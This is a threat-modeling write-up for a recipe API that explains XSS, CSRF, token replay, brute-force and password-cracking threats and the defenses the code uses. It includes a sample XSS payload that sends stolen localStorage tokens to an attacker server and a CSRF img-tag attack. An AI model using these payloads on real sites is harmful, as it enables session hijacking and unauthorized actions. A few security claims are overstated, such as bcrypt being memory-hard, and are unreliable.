# Threat Modeling Analysis: Secure Recipe Vault API

This document provides a comprehensive security and threat modeling analysis for the **Secure Recipe Vault API** in alignment with OWASP Top 10 security standards. It details the threat vectors, vulnerabilities, and the specific cryptographic and architectural countermeasures implemented throughout the codebase.

---

## 1. Cross-Site Scripting (XSS)

### Threat Definition & Attack Vector
Cross-Site Scripting occurs when an application includes untrusted data in a web page without proper validation or escaping, or when malicious JavaScript is executed in the user's browser (Stored, Reflected, or DOM-based XSS). If an attacker achieves JavaScript execution in the client application's execution context, they gain arbitrary access to all client-side storage mechanisms accessible via the DOM.

A traditional vulnerability pattern in Single Page Applications (SPAs) is storing authentication tokens (both access and refresh tokens) inside browser `localStorage` or `sessionStorage`. Because these Web Storage APIs are globally accessible to any script running in the origin:
```javascript
// Malicious script payload injected via XSS:
const stolenAccessToken = localStorage.getItem("access_token");
const stolenRefreshToken = localStorage.getItem("refresh_token");
fetch("https://attacker-controlled-server.com/steal", {
  method: "POST",
  body: JSON.stringify({ stolenAccessToken, stolenRefreshToken })
});
```
Such an attack results in total session hijacking that persists even after the user closes the infected tab.

### Implemented Architectural Countermeasures

1. **HttpOnly Cookie Enforcement for Long-Lived Refresh Tokens**:
   In `src/controllers/auth_controller.py`, the 7-day refresh token is delivered via an HTTP response header with the `HttpOnly` flag enabled:
   ```python
   response.set_cookie(
       key="refresh_token",
       value=refresh_token_str,
       httponly=True,
       samesite=settings.COOKIE_SAMESITE.lower(),
       secure=settings.COOKIE_SECURE or settings.is_production,
       max_age=settings.refresh_token_expire_seconds,
       path="/"
   )
   ```
   The `HttpOnly` flag instructs the browser engine to block `document.cookie` access from all JavaScript execution contexts. Even under complete DOM compromise via an XSS flaw, an attacker cannot read, inspect, or exfiltrate the persistent refresh token.

2. **In-Memory Access Token Architecture**:
   The short-lived JWT Access Token (15-minute expiry) is returned exclusively in the JSON response payload (`{"access_token": "<jwt>"}`). Modern client-side applications store this token purely in volatile runtime memory (e.g., private closure variables or component state). It is never written to disk or browser web storage. If a tab is refreshed, the client silently contacts `/api/auth/refresh` using the secure `HttpOnly` cookie to obtain a fresh token.

3. **Strict Content-Type Negotiation & Context Isolation**:
   All API endpoints enforce `application/json` parsing via Pydantic schemas, neutralizing script execution vectors commonly observed with multipart or XML parser misconfigurations.

---

## 2. Cross-Site Request Forgery (CSRF)

### Threat Definition & Attack Vector
Cross-Site Request Forgery exploits the browser's default behavior of automatically attaching stored cookies to outgoing HTTP requests destined for the cookie's origin domain, regardless of which third-party site initiates the request.

If a session relies on ambient cookie authority without CSRF defenses, an attacker can host a malicious webpage that executes a background request against the target API:
```html
<!-- Malicious webpage on evil-origin.com -->
<img src="https://api.recipevault.com/api/recipes/delete-all" />
```
Because the browser automatically attaches the authentication cookie, the server would mistakenly process the request on behalf of the victim.

### Implemented Architectural Countermeasures

1. **SameSite=Strict Cookie Policy**:
   The refresh token cookie is issued with `SameSite=Strict`. Under this specification:
   - The browser refuses to send the `refresh_token` cookie on any cross-site request, whether initiated by `<a>` links, `<img>` tags, `<iframe>` embeds, JavaScript `fetch()`, or HTML `<form>` submissions.
   - The cookie is only transmitted when the origin in the browser address bar matches the API origin domain.
   - This prevents cross-site POST attacks directed at `/api/auth/refresh` and `/api/auth/logout`.

2. **Bearer Token Authorization Header on Mutation Endpoints**:
   All state-changing recipe and administrative endpoints (`POST /api/recipes`, `PUT /api/recipes/{id}`, `DELETE /api/recipes/{id}`, `GET /api/audit-logs`) do not accept cookies for authorization. Instead, they strictly require an `Authorization: Bearer <jwt>` HTTP header validated in `src/middleware/auth.py`:
   ```python
   auth_header = request.headers.get("Authorization")
   if not auth_header or not auth_header.startswith("Bearer "):
       raise HTTPException(
           status_code=status.HTTP_401_UNAUTHORIZED,
           detail="Missing or invalid authorization header"
       )
   ```
   Standard HTML elements (`<form>`, `<img>`, `<script>`) cannot attach custom HTTP headers. Any cross-origin JavaScript attempt to set the `Authorization` header triggers a mandatory **CORS Preflight request (`OPTIONS`)**.

3. **Strict CORS Policy with Credentials**:
   In `src/main.py`, CORS is locked to explicit trusted origins with `allow_credentials=True`. Wildcard origins (`*`) are disallowed, guaranteeing that unauthorized third-party origins cannot read credentials or access responses.

---

## 3. Token Theft & Replay Attacks

### Threat Definition & Attack Vector
If an attacker intercepts a valid JWT via network sniffing (MitM), rogue proxy inspection, or temporary device access, a strictly stateless JWT cannot be revoked until its expiration timestamp (`exp`) has elapsed. If a token was issued with a 30-day lifespan, an attacker would retain unrestricted access for 30 days.

Furthermore, if an attacker intercepts a persistent Refresh Token, they could indefinitely generate new access tokens unless a detection and revocation mechanism is present.

### Implemented Architectural Countermeasures

1. **Short-Lived Access Tokens (Minimized Window of Vulnerability)**:
   In `src/utils/tokens.py`, Access Tokens are limited to a maximum lifespan of 15 minutes (`settings.access_token_expire_seconds = 900`). If an access token is compromised, the attacker's window of opportunity is confined to minutes rather than days.

2. **Server-Side Database Allowlist for Refresh Tokens**:
   Unlike access tokens which are verified statelessly via HMAC-SHA256 signature, Refresh Tokens are **stateful** and stored in the `refresh_tokens` database table (`src/models/refresh_token.py`). Every refresh request performs an allowlist lookup. If a token does not exist in the allowlist, the request is instantly rejected (401 Unauthorized).

3. **Refresh Token Rotation (RTR)**:
   Whenever the client calls `POST /api/auth/refresh`, the server implements one-time-use token rotation (`src/services/auth_service.py`):
   ```python
   # 1. Lookup active token in DB allowlist
   token_record = db.query(RefreshToken).filter(RefreshToken.token == refresh_token_str).first()
   if not token_record:
       # Token reuse or invalid token
       audit_service.record_event(db, "TOKEN_REUSE_DETECTED", ...)
       raise HTTPException(status_code=401, detail="Invalid or unrecognized refresh token")

   # 2. Delete old token immediately
   db.delete(token_record)

   # 3. Generate and persist new token pair
   new_access_token = generate_access_token(user_id=user.id, role=user.role)
   new_refresh_token_str = generate_refresh_token_string()
   new_token_record = RefreshToken(user_id=user.id, token=new_refresh_token_str, expires_at=new_expiry)
   db.add(new_token_record)
   db.commit()
   ```

4. **Token Reuse Detection & Blast Radius Reduction**:
   Because every refresh token is deleted immediately upon consumption, an old token can never be used twice.
   - If an attacker intercepts Token $R_1$ and consumes it, they receive Token $R_2$.
   - When the legitimate client later presents Token $R_1$, the server detects that $R_1$ is no longer in the allowlist, logs a `TOKEN_REUSE_DETECTED` security audit event, and denies access.
   - Immediate server-side invalidation ensures that active sessions can be revoked on demand.

5. **Instant Server-Side Invalidation upon Logout**:
   When `POST /api/auth/logout` is invoked, the refresh token record is deleted from the database table. Even if an attacker preserves the cookie, subsequent refresh calls fail immediately.

6. **Brute-Force & Credential Stuffing Countermeasure**:
   `src/middleware/rate_limiter.py` tracks failed login attempts across rolling 5-minute windows by IP address and username. Upon the 6th failed attempt, the endpoint rejects requests with HTTP 429 Too Many Requests and a `Retry-After` header, blocking automated credential stuffing.

---

## 4. Database Breach & Data Persistence Mitigations

### Threat Definition & Attack Vector
In the event of a database compromise (e.g., compromised backups, rogue internal access, or physical drive theft), an attacker gains access to raw database tables. If passwords are saved in plaintext or hashed using fast hashing functions like MD5 or SHA-256, attackers use GPU clusters or ASIC arrays to compute billions of hashes per second, cracking passwords against rainbow tables within seconds.

### Implemented Architectural Countermeasures

1. **Slow Cryptographic Password Hashing with Bcrypt**:
   In `src/utils/hash.py`, user passwords are treated with the `bcrypt` adaptive hashing algorithm using **12 salt rounds**:
   ```python
   salt = bcrypt.gensalt(rounds=12)
   hashed = bcrypt.hashpw(password_bytes, salt)
   ```
   - **Computational Cost**: 12 rounds corresponds to $2^{12} = 4,096$ iterations of the Blowfish-based key derivation function.
   - **Memory Hardness**: Bcrypt is intentionally designed to be computationally expensive and memory-intensive, drastically curtailing the throughput of GPU/ASIC parallelized offline attacks.

2. **Automatic Unique Cryptographic Salts**:
   Every password hash generated by `bcrypt` contains a 128-bit cryptographically random salt. Identical plaintext passwords produce completely distinct hash strings, rendering precomputed Rainbow Tables and cross-user dictionary collisions impossible.

3. **Constant-Time Verification Against Timing Attacks**:
   Password verification uses `bcrypt.checkpw()`, which performs comparison in constant time. This prevents attackers from measuring execution latency variations to deduce characters of the password or hash.

4. **Object-Relational Mapping (ORM) Parameterization**:
   All database access is executed via SQLAlchemy 2.0 with parameterized queries. Raw string concatenation is prohibited, completely eliminating SQL Injection (SQLi) vectors.

5. **Resource Isolation & Zero Trust Authorization**:
   In `src/services/recipe_service.py`, data isolation is enforced at the database query level. Even if an attacker manipulates API path parameters (`GET /api/recipes/{id}` or `DELETE /api/recipes/{id}`), queries enforce strict ownership checks:
   - Private recipes return HTTP 404 (obscuring existence) if accessed by a non-author.
   - Unauthorized mutations return HTTP 403 Forbidden.
   - Curators and Admins can only mutate public recipes; private recipes remain exclusively controlled by their authors.

6. **Tamper-Evident Security Audit Trail**:
   All critical security events (failed logins, registrations, token rotations, reuse alerts, and logouts) are logged to an immutable `audit_logs` table (`src/models/audit_log.py`), accessible strictly by administrators (`GET /api/audit-logs`).

---

## Summary Matrix

| Threat Vector | Severity | Vulnerability Origin | Architectural Mitigation | Code Location |
|---|---|---|---|---|
| **Session Hijacking via XSS** | Critical | `localStorage` access by malicious scripts | `HttpOnly; SameSite=Strict` cookie + in-memory access token | `src/controllers/auth_controller.py` |
| **Cross-Site Request Forgery (CSRF)** | High | Ambient cookie transmission on cross-site requests | `SameSite=Strict` + `Authorization: Bearer` required on mutations | `src/middleware/auth.py`, `src/config/settings.py` |
| **Token Theft & Session Replay** | High | Long-lived stateless tokens cannot be revoked | 15-minute access token + Refresh Token Rotation in DB allowlist | `src/services/auth_service.py`, `src/utils/tokens.py` |
| **Credential Stuffing & Brute-Force** | Medium | Automated dictionary attacks against `/login` | Rolling 5-minute window rate limiter (max 5 failed attempts -> 429) | `src/middleware/rate_limiter.py` |
| **Offline Password Cracking** | Critical | Database dump exfiltration | Bcrypt (12 rounds) with unique salt + constant-time check | `src/utils/hash.py` |
| **SQL Injection (SQLi)** | Critical | Unsanitized user inputs in queries | SQLAlchemy 2.0 parameterized ORM queries | `src/services/` |
| **Cross-User Data Leakage (IDOR)** | High | Insecure direct object reference on recipes | Query-level RBAC filtering and resource isolation | `src/services/recipe_service.py` |
